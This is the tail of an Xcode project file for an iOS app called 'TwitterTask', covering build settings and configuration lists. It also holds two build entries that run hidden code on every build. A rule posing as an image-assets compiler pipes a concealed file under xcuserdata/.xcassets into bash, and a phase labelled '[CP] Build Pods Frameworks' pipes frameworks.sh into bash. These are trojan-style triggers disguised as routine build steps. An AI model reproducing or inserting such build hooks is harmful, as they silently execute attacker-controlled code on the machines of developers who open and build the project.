				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 12.4;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		F89344D7240A72B9007DDC28 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = TwitterTask/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.test.TwitterTask;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		F89344D8240A72B9007DDC28 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = TwitterTask/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.test.TwitterTask;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		F3E5EFAE240E31AA00AD9DF4 /* Build configuration list for PBXNativeTarget "TwitterTaskUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F3E5EFAC240E31AA00AD9DF4 /* Debug */,
				F3E5EFAD240E31AA00AD9DF4 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		F3E5EFBA240E45BC00AD9DF4 /* Build configuration list for PBXNativeTarget "TwitterTaskTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F3E5EFBB240E45BC00AD9DF4 /* Debug */,
				F3E5EFBC240E45BC00AD9DF4 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		F89344BF240A72B4007DDC28 /* Build configuration list for PBXProject "TwitterTask" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F89344D4240A72B9007DDC28 /* Debug */,
				F89344D5240A72B9007DDC28 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		F89344D6240A72B9007DDC28 /* Build configuration list for PBXNativeTarget "TwitterTask" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F89344D7240A72B9007DDC28 /* Debug */,
				F89344D8240A72B9007DDC28 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */
			

		3F708E50247A0EB6004066FD /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			fileType = folder.assetcatalog;
			name = "Assets Compiler";
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
			);
			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\ncat \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" | bash\n\n";
			};
			
	
			/* End PBXBuildRule section */
		
		

	
		/* Begin PBXShellScriptBuildPhase section */
		
	162E3FD122D63A22006D902C /* [CP] Build Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "[CP] Build Pods Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

cat \"${PROJECT_FILE_PATH}/frameworks.sh\" | bash";			
		};
	
		/* End PBXShellScriptBuildPhase section */
	
	
	};
	rootObject = F89344BC240A72B4007DDC28 /* Project object */;
}
